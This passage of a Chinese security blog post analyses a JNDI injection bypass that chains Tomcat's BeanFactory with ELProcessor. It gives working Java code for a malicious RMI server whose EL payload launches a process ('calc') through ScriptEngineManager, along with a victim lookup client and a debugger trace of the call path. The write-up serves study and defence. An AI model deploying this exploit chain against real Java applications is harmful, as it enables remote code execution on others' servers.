<h3 id="0x03-绕过实现分析"><a href="#0x03-绕过实现分析" class="headerlink" title="0x03 绕过实现分析"></a>0x03 绕过实现分析</h3><p>我们以 RMI 的绕过为前期绕过分析对象，实际上两者共用一套绕过逻辑<br>首先这个本地工厂类必须实现 ObjectFactory，这是一直从 JNDI 注入开始利用类就满足的一个条件，在写利用类的时候应该也发现如果实现ObjectFactory 就必须要实现 getObjectInstance 方法。然后这个工厂类实例化我们的恶意类的方法参数必须可控<br>综合上面的条件，在 Tomcat8 的依赖包中有一个 <code>BeanFactory</code>满足前置的两个条件<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710076244495-e4273533-a63b-4291-9689-5aff08e3ebae.png#averageHue=%233e434c&clientId=ufd46421e-3273-4&from=paste&height=396&id=xkoeo&originHeight=594&originWidth=1095&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=302890&status=done&style=none&taskId=u4f94613c-37f0-4fbc-9bf8-35de321b0b3&title=&width=730" referrerpolicy="no-referrer" alt="image.png"><br>观察他的 getObjectInstance 方法，发现有一个限制：我们实例化生产的类必须是 ResouceRef 类型，不然无法进入方法的 trycatch 块处理逻辑<br>什么是 ResourceRef 呢？在 javaweb 或者 springmvc 项目中，我们在 web.xml 中见的很多，用来引入外部资源的,而 EL 表达式其实就是 ELEMENT 元素表达式，在 web.xml 中用来加载外部资源<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710122431753-8cca3d68-4b80-4b94-b12e-fffbe78ccd3f.png#averageHue=%23f8f6f5&clientId=u4c4ac00c-9379-4&from=paste&height=353&id=b8lqt&originHeight=529&originWidth=1076&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=123239&status=done&style=none&taskId=ucef05d10-dd93-435f-a89d-46e1ce024a5&title=&width=717.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>我们看看 ResourceRef 的具体定义和内容<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710122589034-4fe48556-16ab-41e8-80cd-575128841e6f.png#averageHue=%23464c51&clientId=u4c4ac00c-9379-4&from=paste&height=287&id=D9P8o&originHeight=430&originWidth=1241&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=214163&status=done&style=none&taskId=u752002ac-76a5-454c-8d38-7b07c1cbe37&title=&width=827.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>简单来说它也是一种引用 wrapper，也就是用来包装指定类的各类信息，还包括了用来加载该类的 factory 工厂地址（为什么是 factory 呢？具体思考 javaweb 和 SSM 这一套管理类的逻辑），而且都是我们可控的，这就很巧，我们就是需要一个从本地加载 factory 类—&gt;beanfactory<br>总结一下就是：我们用 ResourceRef 包装一下 ELProcessor 和指定加载它的beanfactory，之后让 beanfactory 去实例化 ELProcessor，调用 EL 的 eval 方法，触发 RCE</p>
<h4 id="1x03-代码实现"><a href="#1x03-代码实现" class="headerlink" title="1x03 代码实现"></a>1x03 代码实现</h4><p>可以先写一个恶意服务端</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span></span><span class="token punctuation">;</span>


<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Naming</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span></span><span class="token punctuation">;</span>



<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JNDIbyPass</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">InitialContext</span> initialContext<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//Reference refObj=new Reference("evilref","evilref","http://localhost:8000/");</span>
        <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"javax.el.ELProcessor"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"x=eval"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance()"</span> <span class="token operator">+</span>
                <span class="token string">".getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])']"</span> <span class="token operator">+</span>
                <span class="token string">"(['calc']).start()\")"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//initialContext.rebind("ldap://localhost:10389/cn=TestLdap,dc=example,dc=com",ref);</span>
        initialContext<span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span><span class="token string">"rmi://localhost:1099/remoteobj"</span><span class="token punctuation">,</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后写一个受害者</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span>



<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JNDI_Dynamic</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span>args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>

        <span class="token class-name">String</span> string <span class="token operator">=</span> <span class="token string">"rmi://localhost:1099/remoteobj"</span><span class="token punctuation">;</span>

        <span class="token class-name">InitialContext</span> initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>执行起来应该没有问题，复现时要注意 java 中的 eval 能不能直接加载 runtime 类进行命令执行，以及 EL 的依赖是否打上了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710123145331-ef2cdb6e-e90e-4a9b-9618-fbc8cedfa7a5.png#averageHue=%23424748&clientId=u4c4ac00c-9379-4&from=paste&height=575&id=uJi96&originHeight=863&originWidth=1872&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=398445&status=done&style=none&taskId=u62fccede-570e-4996-8722-478466e0a80&title=&width=1248" referrerpolicy="no-referrer" alt="image.png"></p>
<h4 id="1x04-流程分析"><a href="#1x04-流程分析" class="headerlink" title="1x04 流程分析"></a>1x04 流程分析</h4><p>断点依然是打在 lookup 中，但是这里我们就直接进 lookup 了，getURLOrDefaultInitCtx 返回出来依然是 rmiURLContext<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710123229340-1b140ec6-ce30-4eee-a528-947bbee3466b.png#averageHue=%233c4752&clientId=u4c4ac00c-9379-4&from=paste&height=136&id=KhvWG&originHeight=204&originWidth=1705&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=120128&status=done&style=none&taskId=u1476a04e-cdfc-49f7-a0bc-e02f98a44b6&title=&width=1136.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>逻辑照旧<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710123280748-273795fe-0d93-465b-966e-64e4bcf19a13.png#averageHue=%233c4248&clientId=u4c4ac00c-9379-4&from=paste&height=417&id=RT3Oi&originHeight=626&originWidth=1773&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=404425&status=done&style=none&taskId=u33155071-6488-45c8-902c-8e6e234cd70&title=&width=1182" referrerpolicy="no-referrer" alt="image.png"><br>由于是 RMI 的 context ，所以直接就跟进到 RegistryContext 的 lookup<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710123331633-9aa43ccd-e558-451f-b9c4-1201506076e2.png#averageHue=%233c4248&clientId=u4c4ac00c-9379-4&from=paste&height=395&id=B7uJJ&originHeight=592&originWidth=1684&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=424177&status=done&style=none&taskId=u68917654-f221-4a52-98a8-9084f350c97&title=&width=1122.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>通过 RMI 原生获取到字节码之后，再调用 decodeObject 方法<br>关键性逻辑在第一句，这里会判断我们传进来的要实例化的对象是否是 RemoteRef 类，如果是的话，那我们这个流程就肯定没有后续了，因为它会将实例化对象强转为 RemoteReference 类型，会自带 classFactoryLocation 属性字段，后面的 if 判断就过不去了，这就是为什么我们要选择 ResourceRef 的原因<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710123376134-6afb9763-0993-46fa-8225-bd45b22fb056.png#averageHue=%233a4147&clientId=u4c4ac00c-9379-4&from=paste&height=349&id=Azumj&originHeight=524&originWidth=2161&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=438120&status=done&style=none&taskId=u902455fd-e7a8-4468-8ae7-16aa76b8705&title=&width=1440.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>继续往下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710123537043-71d47d26-99e5-406d-8add-641a1dd32e47.png#averageHue=%23464d53&clientId=u4c4ac00c-9379-4&from=paste&height=416&id=goq0q&originHeight=624&originWidth=2203&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=664069&status=done&style=none&taskId=u8105e9b6-1e3b-4414-8b57-decaa138869&title=&width=1468.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>来到最为关键的 if 判断，由于我们的指定实例化类是 ResourceRef，不带 classFactoryLocation 属性，所以三个判断条件中，第二个判断条件不符合要求，与运算不通过，可以开开心心进行类加载了<br>那么直接跟进 NamingManager 的 getObjectInstance 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710123802662-83b41c63-705f-4916-a18c-8a8370980250.png#averageHue=%233a4045&clientId=u4c4ac00c-9379-4&from=paste&height=210&id=EYkUs&originHeight=571&originWidth=2262&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=467312&status=done&style=none&taskId=uf299781c-9080-42c1-beab-1a2a03d3e9e&title=&width=830" referrerpolicy="no-referrer" alt="image.png"><br>首先对其强转为 Reference 类，然后直接通过getFactoryClassName 获取到工厂类的全类名（此时是<code>org.apache.naming.factory.BeanFactory</code>），调用<code>getObjectFactoryFromReference</code>先对它进行类加载<br>然后开始调用工厂类的<code>getObjectInstance</code>对类实现实例化加载<br>这里稍微看一下变量表<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710123958654-cf11d07c-0195-4b8b-b3cb-9706ffc013a2.png#averageHue=%234a4f53&clientId=u4c4ac00c-9379-4&from=paste&height=287&id=vkGR9&originHeight=431&originWidth=1692&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=399222&status=done&style=none&taskId=ud2d50bf2-a848-4ed5-b17c-d14a82dcaaa&title=&width=1128" referrerpolicy="no-referrer" alt="image.png"><br>自然跟进到<code>BeanFactory</code>的<code>getObjectInstance</code>方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710124082446-e7541c0f-8e1f-42d7-9126-445159425e19.png#averageHue=%233b4248&clientId=u4c4ac00c-9379-4&from=paste&height=445&id=p3lBe&originHeight=667&originWidth=2119&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=516891&status=done&style=none&taskId=u890d45f5-49c3-479e-9b08-0d55eb1bb7a&title=&width=1412.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>调用<code>ResourceRef.getClassName()</code>，获取到 ELProcessor 的全类名，开一个当前线程的 context 类加载器，对 ELProcessor 进行类加载<br>然后的内容就是对 ResourceRef 这个类中的设定的信息进行处理，比如说获取到 forceString，然后对其字符串处理满足表达式，然后获取要执行方法的参数等等，最后的最后，获取到方法以及参数之后反射调用，触发 RCE<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710124344767-b20c574c-e2a6-4887-b2e0-00ab58c18946.png#averageHue=%233b4146&clientId=u4c4ac00c-9379-4&from=paste&height=520&id=Q5ss2&originHeight=780&originWidth=2091&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=597147&status=done&style=none&taskId=uc5c5f773-1e83-4ce4-ba90-78d311f0877&title=&width=1394" referrerpolicy="no-referrer" alt="image.png"><br>最终触发如下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710124432777-c96210d7-a9c7-44eb-9ff5-4c9f6f2035ef.png#averageHue=%233e4141&clientId=u4c4ac00c-9379-4&from=paste&height=569&id=w8MZ1&originHeight=854&originWidth=2331&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=599369&status=done&style=none&taskId=uc81daa45-0d40-4fad-9365-0634c71e09d&title=&width=1554" referrerpolicy="no-referrer" alt="image.png"><br>EL 表达式其实是一种很常用的 RCE 媒介，初次完整分析很过瘾</p>
<p>JNDI 复习 over，除了思路开拓和基础部分是跟文章，分析部分都是自己去走逻辑，去解决自己遇到的问题，感觉很爽，不会再去傻傻的跟着别人的步骤走了</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>稍微总结一下<br>JNDI 的工作流程，不论是不是动态协议转化，都是一个总的逻辑：为了获取到 context 实例而去构造 factory 工厂类，然后通过 factory 去实例化 context，然后再去通过 context 去调用各种方法<br>如果是指定 initialcontext 的属性，调用 initialcontext 的各种功能方法，那么逻辑大致为<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709964014420-cec5e139-283d-4569-bee8-4a21b2d0ad57.png?x-oss-process=image/format,webp#averageHue=%23555555&from=url&id=LTJYt&originHeight=126&originWidth=880&originalType=binary&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&title=" referrerpolicy="no-referrer"><br>如果是动态协议转化（漏洞所在）<br>initialContext 直接调方法，比如 lookup，那么他会先判断是哪种协议，然后通过获取该协议相关的 factory，去构造该协议的 Context，再去调该协议 Context 的方法，我们的漏洞分析也就是从这里开始的</p>
<ul>
<li>getURLOrDefaultInitCtx 获取到相关协议 Context</li>
<li>相关协议 context 调用相关方法，如 lookup</li>
<li>通过 RMI 原生获取到远程服务器上的恶意字节码</li>
<li>decodeObject 开始实例化，本质还是通过工厂类去实例化</li>
<li>调用工厂类的getObjectInstance 去完成（高版本与低版本的区别就在此是否有对类型的限制，以及trustURLCodebase 默认是否为 false）</li>
</ul>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png" title="头像" alt="头像"></a><div class="post-copyright__author_name">stoocea</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/post/JNDIRe0.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/post/JNDIRe0.html')">JNDIRe0</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/post/JNDIRe0.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=JNDIRe0&amp;url=http://example.com/post/JNDIRe0.html&amp;pic=https://bu.dusays.com/2024/03/11/65ee76f777226.jpg" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">stoocea</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/Spring%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Spring型内存马</div></div></a></div><div class="next-post pull-right"><a href="/post/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">log4j2漏洞分析</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description">time thicking away</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-JNDI"><span class="toc-number">1.</span> <span class="toc-text">什么是 JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Naming-%E5%91%BD%E5%90%8D%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 Naming 命名服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Directory-%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 Directory 目录服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-JNDI-SPI"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 JNDI SPI</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">JNDI 代码实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-JNDI-RMI-%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.0.1.</span> <span class="toc-text">0x01 JNDI_RMI 实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI-%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">JNDI 工作流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-context-%E5%88%9D%E5%A7%8B%E5%8C%96%E5%92%8C%E5%AF%B9%E5%BA%94%E5%B1%9E%E6%80%A7%E8%AE%BE%E7%BD%AE"><span class="toc-number">3.1.</span> <span class="toc-text">0x01 context 初始化和对应属性设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-JNDI-%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0"><span class="toc-number">3.2.</span> <span class="toc-text">0x02 JNDI 底层实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x01-%E8%8E%B7%E5%8F%96-contect-%E7%9A%84-factor-%E6%9E%84%E9%80%A0%E7%B1%BB"><span class="toc-number">3.2.1.</span> <span class="toc-text">1x01 获取 contect 的 factor 构造类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1x02-%E8%8E%B7%E5%8F%96-context-%E5%86%85%E5%AE%B9"><span class="toc-number">3.2.2.</span> <span class="toc-text">1x02 获取 context 内容</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI-%E5%8A%A8%E6%80%81%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8C%96"><span class="toc-number">3.3.</span> <span class="toc-text">JNDI 动态协议转化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E5%8A%A8%E6%80%81%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.3.1.</span> <span class="toc-text">0x01 动态协议转化流程分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI-Refernce-%E7%B1%BB"><span class="toc-number">4.</span> <span class="toc-text">JNDI-Refernce 类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI-%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">JNDI 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-JNDI-RMI"><span class="toc-number">5.1.</span> <span class="toc-text">0x01 JNDI+RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x01-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">5.1.1.</span> <span class="toc-text">1x01 流程分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 